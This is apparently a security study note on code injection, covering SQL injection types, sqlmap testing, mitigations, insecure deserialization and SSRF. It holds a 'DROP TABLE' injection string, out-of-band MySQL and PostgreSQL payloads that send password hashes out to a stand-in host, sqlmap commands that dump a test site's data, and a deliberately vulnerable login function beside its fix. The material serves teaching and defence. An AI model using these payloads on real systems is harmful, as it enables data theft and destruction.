---
title: Code Injection
description: Code injection is the exploitation of a computer bug that is caused by processing invalid data
---

# Code Injection

Untrusted user input is interpreted **by server and executed**

## Impact

Data can be stolen, modified, or deleted

## SQL Injection

SQL injection occur when an attacker is able to inject SQL queries via the input data of an application

- When data enters a program from an untrusted source and that data is used to dynamically construct a SQL query
- SQL doesn't distinguish between the control plane and the data plane
- The attacker can place a meta character (a character not interpreted as data, such as an underscore `_` which, in SQL, will read as a wild card for a single character) into data input, then follow by entering SQL commands in the control plane

A successful attack allows an attacker to access and manipulate the backend database

Causes:

- User input is used to dynamically build queries
- If input is not but validated the query interrupted
- Can be tricked into running arbitrary SQL queries or commands

_Example:_ If the string `Robert'); DROP TABLE Students;–-` were entered into a query which requested the `studentName`, then the query would become the following:

```sql
AND studentName = 'Robert';
DROP TABLE Students;
--'
```

### Types of SQL Injection

1. **Error-Based SQL Injection**: The attacker relies on detailed error messages from the database to learn about the database structure

   - In order to prevent this, only generic error messages should be shown

2. **Blind SQL Injection**: When the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection

   The attacker doesn't receive direct error messages or query results from the database. Instead an attacker may verify whether a sent request returned true or false in a few ways:

   1. _Content-based attacks_

   2. _Time-based attacks_ (where the attacker measures the time it takes for the application to respond to different queries)

   - When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions
   - This makes exploiting the SQL Injection vulnerability more difficult, but not impossible

3. **UNION SQL Injection**:

   - Leverages the UNION operator to retrieve data from multiple tables in the database

4. **Out of Band SQL Injection**: (more advanced and sophisticated, relatively uncommon) When an attacker can't receive a response to their command in the same channel they submitted it

   - Instead, it relies upon a server's ability to use another protocol (like HTTP or DNS) to deliver the responses to an attacker's query
   - Instead, they force the database to make external connections to deliver the results of the query

   _Example:_ Out-of-band SQL injection in:

   ```sql
   -- MySQL
   SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'));
   ```

   ```sql
   -- PostgreSQL
   DROP TABLE IF EXISTS table_output;
   CREATE TABLE table_output(content text);
   CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$ DECLARE exec_cmd TEXT;
   DECLARE query_result_version TEXT;
   DECLARE query_result_user TEXT;
   DECLARE query_result_password TEXT;
   BEGIN
     SELECT INTO query_result_version (SELECT current_setting('server_version'));
     SELECT INTO query_result_user (SELECT usename FROM pg_shadow);
     SELECT INTO query_result_password (SELECT passwd FROM pg_shadow);
     exec_cmd := E'COPY table_output(content)
       FROM E\'\\\\\\\\'||query_result_version||'.'||query_result_user||'.'||query_result_password||E'.example.com\\\\test.txt\'';
     EXECUTE exec_cmd;
   END;
   $$ LANGUAGE plpgsql SECURITY DEFINER;
   SELECT temp_function();
   ```

### Testing

Using [`sqlmap`](https://sqlmap.org/) a penetration testing tool that automates the process of detecting and exploiting SQL injection flaws

_Example:_ Vulnerable URL: `http://testphp.vulnweb.com/listproducts.php?cat=1`

1. List information about the existing databases

   ```bash
   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
   ```

2. List information about Tables present in a particular Database

   ```bash
   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
   ```

3. List information about the columns of a particular table

   ```bash
   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
   ```

4. Dump the data from the columns

   ```bash
   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
   ```

### Mitigation

- Use **parametrized queries or prepared statements**
- Use **Stored Procedures**

  - The difference between stored procedures and prepared statements is that stored procedures are defined and stored within the database, but called from the application

- Allow-list Input Validation: Use all or left validation on all user inputs. This ensures all input is checked against and allowed list of input parameters before they are processed in the code
- Implement proper input sanitization (Escaping All User Supplied Input)
- Apply the _least privilege principal_ on all database accounts
- Typically found by penetration testers/secure code review
- Consider `GET` and `POST` parameters cookies and other http headers
- Use Web Application Firewalls (WAFs) to detect and block suspicious requests
- Use latest frameworks

## GET Request

## POST Request

Vulnerable Node.JS code:

```javascript
function authenticate(req, res, next){
  const username = req.query.username,
        password = req.query.password
  let sqlRequest = new sql.Request(),
      sqlQuery = "select * from users where (username= '" + username + "' and password ='" + password + "')"
  sqlRequest.query(sqlQuery).then(function(recordSet){
    if(recordSet.length == 1){
      loggedIn = true
      //successful log in
    } else {
      authentication failed
    }
  })
  .catch(next)
}
```

Fixed code:

```javascript
function authenticate(req, res, next) {
  const username = req.query.username,
    password = req.query.password;
  let preparedStatement = new sql.PreparedStatment(),
    sqlQuery =
      "select * from users where (username = @username and password = @password)";

  preparedStatement.input("username", sqlVarChar(50));
  preparedStatement.input("password", sqlVarChar(50));
  preparedStatement
    .prepare(sqlQuery)
    .then(function () {
      return preparedStatement
        .execute({ username: username, password: password })
        .then(function (recordSet) {
          if (recordSet.length == 1) {
            loggedIn = true;
            //successful log in
          } else {
            //authentication failed
          }
        });
    })
    .catch(next);
}
```

## insecure deserialization

serialisation is when data structures object states are translated into a format that can be stored

deserialization is the opposite process it involves extracting a data structure from a series of bytes

insecure deserialization occurs when untrusted data is used to abuse the logic flow of an application

- execute arbitrary code or inflict a denial of service (DoS) when it is being de-serialized

Causes:

- trusting data provided by sanitized object more than classic user input

Prevention:

- sanitize the data of a serialised object as untrusted user input through filtering or validation

- implement integrity checks such as digital signatures on any serialised object. this will prevent tempering

- isolate and run code that de-serializs in a low privilege environment

## server-side request forgery

this is a vulnerability in which the server can be made to perform a request on the hackers behalf

hacker could:

- scan for open ports
- retrieve files
- access internal services

this vulnerability usually occurs when an application is not restricting the location and type of resources it can access

Prevention:

- restrict requests made by the server to whitelisted locations whenever possible
- verify that the requested filetype matches that which is expected
- display a generic error in the event of failure
- restrict requests to approved URL scheme

## References

- [Defeating SQL Injection](https://www.computer.org/csdl/magazine/co/2013/03/mco2013030069/13rRUxZRbsU)

- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

- [SQL injection - PortSwigger](https://portswigger.net/web-security/sql-injection)

- [SQL injection cheat sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
